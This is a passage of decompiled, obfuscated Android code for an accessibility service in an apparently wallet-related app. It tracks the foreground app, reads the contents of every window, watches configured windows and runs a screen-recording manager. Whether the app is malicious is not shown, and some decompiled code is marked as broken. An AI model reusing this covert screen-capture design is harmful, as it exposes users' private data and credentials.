                        }
                    }
                    if (c0.m1052a(accessibilityEvent.getEventType())) {
                        if (Build.VERSION.SDK_INT >= 30) {
                            AbstractC0000a.m26v();
                            obtain = AbstractC0008h.m63i(accessibilityEvent);
                        } else {
                            obtain = AccessibilityEvent.obtain(accessibilityEvent);
                        }
                        c0Var.getClass();
                        try {
                            if (!AbstractC0026q.m154E(7912) || c0Var.f856c.get()) {
                                return;
                            }
                            c0Var.f854a.submit(new b0(c0Var, obtain, 0));
                            return;
                        } catch (Exception e4) {
                            AbstractC0026q.m186s("o.c0", e4);
                            return;
                        }
                    }
                    return;
                    AbstractC0026q.m186s("MyAccessibilityService", e2);
                }
            }
        }
    }

    public final int d0() {
        int i2 = 0;
        try {
            if (!(this.f328k.get() >= 1) && AbstractC0252h.m715s()) {
                String i02 = AbstractC0251g.i0();
                if (!AbstractC0026q.m151B(i02)) {
                    String concat = i02.concat("/").concat("listenWindows.json");
                    Log.d("MyAccessibilityService", concat);
                    String m160K = AbstractC0026q.m160K(concat);
                    Log.d("MyAccessibilityService", "准备添加本地监听窗口:" + m160K);
                    try {
                        if (AbstractC0026q.m151B(m160K) || AbstractC0251g.m634G(m160K) <= 0) {
                            m557F(1);
                            return 1;
                        }
                        Log.d("MyAccessibilityService", "已添加本地监听窗口");
                        m557F(2);
                        return 2;
                    } catch (Exception e2) {
                        e = e2;
                        i2 = 1;
                        AbstractC0026q.m186s("MyAccessibilityService", e);
                        return i2;
                    }
                }
            }
        } catch (Exception e3) {
            e = e3;
        }
        return i2;
    }

    public final void f0(AccessibilityEvent accessibilityEvent) {
        try {
            if (this.f331n.get() || m566W(accessibilityEvent)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
            if (!concurrentLinkedQueue.isEmpty()) {
                Iterator it = concurrentLinkedQueue.iterator();
                while (it.hasNext()) {
                    C0416e c0416e = (C0416e) it.next();
                    if (c0416e != null && c0416e.m1076o() && c0416e.m1073l() != null && !c0416e.m1073l().isEmpty() && c0416e.m1073l().contains(Integer.valueOf(accessibilityEvent.getEventType()))) {
                        c0416e.mo1002u(accessibilityEvent, (String) f325u.get(), (String) f326v.get());
                    }
                }
            }
            g0(accessibilityEvent);
        } catch (Exception e2) {
            AbstractC0026q.m186s("noticeAccessibilityEvent", e2);
        }
    }

    public final void g0(AccessibilityEvent accessibilityEvent) {
        g0 g0Var = this.f309g;
        try {
            if (g0Var.m1076o() && g0Var.m1102S()) {
                AtomicReference atomicReference = f325u;
                String str = (String) atomicReference.get();
                AtomicReference atomicReference2 = f326v;
                if (!g0Var.m1065c(str, (String) atomicReference2.get()) || g0Var.m1073l() == null || g0Var.m1073l().isEmpty() || !g0Var.m1073l().contains(Integer.valueOf(accessibilityEvent.getEventType()))) {
                    return;
                }
                g0Var.mo1002u(accessibilityEvent, (String) atomicReference.get(), (String) atomicReference2.get());
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    public final boolean h0(String str, String str2, String str3, boolean z2) {
        boolean z3 = false;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            boolean z4 = false;
            while (it.hasNext()) {
                try {
                    C0416e c0416e = (C0416e) it.next();
                    if (c0416e != null) {
                        if (c0416e.m1065c(str, str2)) {
                            if (!Objects.equals(Boolean.TRUE, Boolean.valueOf(c0416e.m1076o()))) {
                                c0416e.m1082w(true);
                            }
                            c0416e.m1081v((UiObject) f323s.get(), z2, str, str2, str3);
                            z4 = true;
                        } else if (!Objects.equals(Boolean.FALSE, Boolean.valueOf(c0416e.m1076o()))) {
                            c0416e.m1082w(false);
                        }
                    }
                } catch (Exception e2) {
                    e = e2;
                    z3 = z4;
                    AbstractC0026q.m186s("noticeRootChanged", e);
                    return z3;
                }
            }
            return z4;
        } catch (Exception e3) {
            e = e3;
        }
    }

    public final boolean i0(String str, String str2, String str3, boolean z2) {
        g0 g0Var = this.f309g;
        boolean z3 = false;
        try {
            if (g0Var.m1065c(str, str2)) {
                g0Var.m1082w(true);
                this.f309g.m1081v((UiObject) f323s.get(), z2, str, str2, str3);
                z3 = true;
            } else {
                g0Var.m1103V(str, str2);
                if (!Objects.equals(Boolean.FALSE, Boolean.valueOf(g0Var.m1076o()))) {
                    g0Var.m1082w(false);
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
        return z3;
    }

    public final void j0() {
        try {
            f322r.set(false);
            this.f332o = new ThreadPoolExecutor(0, 20, 50L, TimeUnit.MILLISECONDS, new SynchronousQueue());
            f320p.set(this);
            if (!AbstractC0251g.p0() && AbstractC0252h.m713q()) {
                AbstractC0251g.F0(1);
                AbstractC0251g.T0(5);
                synchronized (AbstractC0252h.class) {
                    AbstractC0252h.m683D(Boolean.FALSE, "isFirstOpenAccessibility");
                }
            }
            p0();
            if (d0() <= 2) {
                AbstractC0207l.m421d();
            }
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerAccessibilityEvent(32);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    public final ReadScreenWindow k0() {
        int i2;
        String m563T = m563T();
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null && !windows.isEmpty()) {
                for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                    if (accessibilityWindowInfo != null && accessibilityWindowInfo.isActive()) {
                        i2 = accessibilityWindowInfo.getId();
                        break;
                    }
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
        i2 = -1;
        ReadScreenWindow readScreenWindow = new ReadScreenWindow(m563T, i2, (String) f325u.get(), (String) f326v.get());
        List<AccessibilityWindowInfo> windows2 = getWindows();
        if (windows2 != null && !windows2.isEmpty()) {
            for (AccessibilityWindowInfo accessibilityWindowInfo2 : windows2) {
                if (accessibilityWindowInfo2 != null) {
                    AccessibilityNodeInfo root = Build.VERSION.SDK_INT >= 33 ? accessibilityWindowInfo2.getRoot(4) : accessibilityWindowInfo2.getRoot();
                    if (root != null) {
                        e0(m0(root), 0, 0, readScreenWindow);
                    }
                }
            }
        }
        return readScreenWindow;
    }

    public final NoticeRootChangedVO l0(boolean z2) {
        String str;
        boolean z3;
        AtomicReference atomicReference = f326v;
        AtomicReference atomicReference2 = f325u;
        AtomicReference atomicReference3 = f323s;
        try {
            RootInActiveWindowResult m561R = m561R();
            AccessibilityNodeInfo curRoot = m561R.getCurRoot();
            if (curRoot != null) {
                String charSequence = curRoot.getPackageName() != null ? curRoot.getPackageName().toString() : null;
                String charSequence2 = curRoot.getClassName() != null ? curRoot.getClassName().toString() : null;
                AtomicReference atomicReference4 = f324t;
                if (!curRoot.equals(atomicReference4.get())) {
                    Log.d("MyAccessibilityService", "当前视图根节点已变化");
                }
                UiObject createRoot = UiObject.createRoot(curRoot);
                if (atomicReference2.get() != null) {
                    str = "当前运行窗口已变化 new windowTitle:";
                    Log.d("MyAccessibilityService", "上一个运行包名 old activePackageName:" + ((String) atomicReference2.get()));
                } else {
                    str = "当前运行窗口已变化 new windowTitle:";
                }
                if (atomicReference.get() != null) {
                    Log.d("MyAccessibilityService", "上一个运行窗口 old activeWindowClassName:" + atomicReference);
                }
                if (!AbstractC0026q.m151B(charSequence2)) {
                    Log.d("MyAccessibilityService", "当前视图栈顶节点:" + charSequence2);
                }
                boolean equals = Objects.equals(atomicReference2.get(), charSequence);
                AtomicReference atomicReference5 = f327w;
                boolean z4 = true;
                if (equals) {
                    z3 = false;
                    if (!m531l(AbstractC0251g.v0(charSequence, charSequence2, C0416e.class.getName())) || Objects.equals(atomicReference.get(), charSequence2)) {
                        z4 = false;
                    } else {
                        atomicReference.set(charSequence2);
                        atomicReference5.set(m563T());
                        z3 = true;
                        z4 = false;
                    }
                } else {
                    atomicReference2.set(charSequence);
                    atomicReference.set(charSequence2);
                    atomicReference5.set(m563T());
                    z3 = true;
                }
                m559H(z4, z3);
                atomicReference4.set(curRoot);
                atomicReference3.set(createRoot);
                if (z4) {
                    Log.d("MyAccessibilityService", "当前运行包名已变化 new rootPackageName:" + ((String) atomicReference2.get()));
                }
                if (z3) {
                    Log.d("MyAccessibilityService", "当前运行窗口已变化 new windowClassName:" + ((String) atomicReference.get()));
                    Log.d("MyAccessibilityService", str + ((String) atomicReference5.get()));
                }
                if (z2) {
                    h0((String) atomicReference2.get(), (String) atomicReference.get(), (String) atomicReference5.get(), m561R.isComplete());
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
        return new NoticeRootChangedVO((UiObject) atomicReference3.get(), (String) atomicReference2.get(), (String) atomicReference.get());
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        int i2;
        AccessibilityEvent obtain;
        ReentrantLock reentrantLock = this.f329l;
        if (!reentrantLock.tryLock()) {
            Log.e("MyAccessibilityService", "onAccessibilityEvent 事件被忽略:" + accessibilityEvent.toString());
            return;
        }
        try {
            i2 = 1;
            this.f310h.set(true);
            AtomicReference atomicReference = f320p;
            if (atomicReference.get() == null) {
                atomicReference.set(this);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            Log.e("MyAccessibilityService", "onAccessibilityEvent 出错");
        }
        if (m564U(accessibilityEvent)) {
            reentrantLock.unlock();
            return;
        }
        if (AbstractC0956a.m1443a()) {
            reentrantLock.unlock();
            return;
        }
        m558G(accessibilityEvent);
        f0(accessibilityEvent);
        b0(accessibilityEvent);
        c0(accessibilityEvent);
        try {
            if (!m567X(accessibilityEvent) && this.f332o != null) {
                if (Build.VERSION.SDK_INT >= 30) {
                    AbstractC0000a.m26v();
                    obtain = AbstractC0008h.m63i(accessibilityEvent);
                } else {
                    obtain = AccessibilityEvent.obtain(accessibilityEvent);
                }
                this.f332o.submit(new b0(this, obtain, i2));
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("MyAccessibilityService", e3);
        }
        reentrantLock.unlock();
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        try {
            f323s.set(null);
            f324t.set(null);
            f325u.set(null);
            f326v.set(null);
            Log.d("MyAccessibilityService", "MyAccessibilityService on create");
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    @Override // android.app.Service
    public final void onDestroy() {
        Log.d("MyAccessibilityService", "无障碍服务已销毁");
        try {
            this.f310h.set(false);
            ThreadPoolExecutor threadPoolExecutor = this.f332o;
            if (threadPoolExecutor != null) {
                threadPoolExecutor.shutdownNow();
                this.f332o = null;
            }
            this.f309g.mo1001d();
            C0429r c0429r = this.f307e;
            c0429r.getClass();
            try {
                c0429r.f954a.shutdownNow();
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.r", e2);
            }
            C0260a c0260a = this.f330m;
            if (c0260a != null) {
                try {
                    C0260a.f421i.shutdownNow();
                    C0260a.f422j.clear();
                    c0260a.f426d.cancel();
                    c0260a.f424b.set(false);
                    c0260a.f423a.clear();
                } catch (Exception e3) {
                    AbstractC0026q.m186s("VideoRecordManager", e3);
                }
                this.f330m = null;
            }
            f323s.set(null);
            f324t.set(null);
            f325u.set(null);
            f326v.set(null);
            m519D();
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
            try {
                if (!concurrentLinkedQueue.isEmpty()) {
                    concurrentLinkedQueue.removeIf(new C0001a(this, 4));
                }
            } catch (Exception e4) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e4);
            }
            concurrentLinkedQueue.clear();
            this.f328k.set(0);
            this.f304b.clear();
            this.f305c.clear();
            this.f306d.clear();
            q0();
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerStrategyEvent("ACCESSIBILITY_SERVICE_OFF");
            }
            f320p.set(null);
        } catch (Exception e5) {
            AbstractC0026q.m186s("MyAccessibilityService", e5);
        }
        super.onDestroy();
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onInterrupt() {
        Log.d("MyAccessibilityService", "无障碍服务已中断");
    }

    @Override // android.app.Service, android.content.ComponentCallbacks
    public final void onLowMemory() {
        try {
            Log.d("MyAccessibilityService", "无障碍服务 onLowMemory");
            m559H(true, true);
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
        super.onLowMemory();
    }

    @Override // android.app.Service
    public final void onRebind(Intent intent) {
        super.onRebind(intent);
        try {
            Log.d("MyAccessibilityService", "无障碍服务已重启");
            f323s.set(null);
            f324t.set(null);
            f325u.set(null);
            f326v.set(null);
            j0();
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onServiceConnected() {
        super.onServiceConnected();
        try {
            r0();
            j0();
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    @Override // android.app.Service
    public final void onStart(Intent intent, int i2) {
        super.onStart(intent, i2);
        Log.d("MyAccessibilityService", "MyAccessibilityService on start");
    }

    @Override // android.app.Service
    public final void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        Log.d("MyAccessibilityService", "Service on task removed");
    }

    @Override // android.app.Service, android.content.ComponentCallbacks2
    public final void onTrimMemory(int i2) {
        try {
            Log.d("MyAccessibilityService", "无障碍服务 onTrimMemory level:" + i2);
            m559H(true, true);
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
        super.onTrimMemory(i2);
    }

    @Override // android.app.Service
    public final boolean onUnbind(Intent intent) {
        Log.d("MyAccessibilityService", "无障碍服务已关闭");
        return super.onUnbind(intent);
    }

    public final void p0() {
        try {
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            ContainerEventVO containerEventVO = new ContainerEventVO();
            containerEventVO.setPackageName(getPackageName());
            containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
            containerEventVO.setIsOpened(1);
            containerEventVO.setServiceState(-1);
            messageRecordVO.setIntentCode("android.intent.action.CONTAINER_EVENT");
            messageRecordVO.setExtraBody(containerEventVO);
            if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    public final void q0() {
        try {
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            ContainerEventVO containerEventVO = new ContainerEventVO();
            containerEventVO.setPackageName(getPackageName());
            containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
            containerEventVO.setIsOpened(0);
            containerEventVO.setServiceState(-1);
            messageRecordVO.setIntentCode("android.intent.action.CONTAINER_EVENT");
            messageRecordVO.setExtraBody(containerEventVO);
            if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x0047 A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:3:0x0002, B:6:0x000b, B:13:0x002b, B:15:0x0047, B:16:0x004a, B:21:0x0027, B:10:0x0014, B:12:0x001e), top: B:2:0x0002, inners: #1 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void r0() {
        boolean z2;
        Field declaredField;
        try {
            AccessibilityServiceInfo serviceInfo = getServiceInfo();
            AtomicBoolean atomicBoolean = this.f311i;
            if (serviceInfo == null) {
                Log.d("MyAccessibilityService", "ServiceInfo in Null");
                atomicBoolean.set(true);
                return;
            }
            try {
                declaredField = AccessibilityServiceInfo.class.getDeclaredField("crashed");
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
            if (declaredField != null) {
                declaredField.setAccessible(true);
                z2 = declaredField.getBoolean(serviceInfo);
                atomicBoolean.set(z2);
                serviceInfo.feedbackType = -1;
                serviceInfo.eventTypes = 8419391;
                serviceInfo.flags = 91;
                serviceInfo.notificationTimeout = 0L;
                setServiceInfo(serviceInfo);
                if (Build.VERSION.SDK_INT >= 33) {
                    setCacheEnabled(true);
                }
                Log.d("MyAccessibilityService", "辅助功能进入正常模式");
            }
            z2 = false;
            atomicBoolean.set(z2);
            serviceInfo.feedbackType = -1;
            serviceInfo.eventTypes = 8419391;
            serviceInfo.flags = 91;
            serviceInfo.notificationTimeout = 0L;
            setServiceInfo(serviceInfo);
            if (Build.VERSION.SDK_INT >= 33) {
            }
            Log.d("MyAccessibilityService", "辅助功能进入正常模式");
        } catch (Exception e3) {
            AbstractC0026q.m186s("MyAccessibilityService", e3);
        }
    }

    public final boolean s0() {
        try {
            if (m568Y()) {
                return false;
            }
            if (this.f330m == null) {
                ScreenMetricsVO m616e = AbstractC0249e.m616e();
                this.f330m = new C0260a(m616e.getWidth().intValue() / 2, m616e.getHeight().intValue() / 2);
            }
            C0260a c0260a = this.f330m;
            AtomicBoolean atomicBoolean = c0260a.f424b;
            if (!atomicBoolean.get()) {
                try {
                    c0260a.f426d.schedule(c0260a.f427e, 40L, 40L);
                    atomicBoolean.set(true);
                    c0260a.f425c.set(System.currentTimeMillis());
                } catch (Exception e2) {
                    AbstractC0026q.m186s("VideoRecordManager", e2);
                }
            }
            return true;
        } catch (Exception e3) {
            AbstractC0026q.m186s("MyAccessibilityService", e3);
            return false;
        }
    }

    public final boolean t0() {
        try {
            if (!m568Y()) {
                return false;
            }
            C0260a c0260a = this.f330m;
            if (c0260a == null) {
                return true;
            }
            try {
                c0260a.f426d.cancel();
                c0260a.f424b.set(false);
                c0260a.f425c.set(System.currentTimeMillis());
                c0260a.m734a();
            } catch (Exception e2) {
                AbstractC0026q.m186s("VideoRecordManager", e2);
            }
            C0260a c0260a2 = this.f330m;
            c0260a2.getClass();
            try {
                c0260a2.f424b.set(false);
                c0260a2.f423a.clear();
            } catch (Exception e3) {
                AbstractC0026q.m186s("VideoRecordManager", e3);
            }
            this.f330m = null;
            return true;
        } catch (Exception e4) {
            AbstractC0026q.m186s("MyAccessibilityService", e4);
            return false;
        }
    }
}
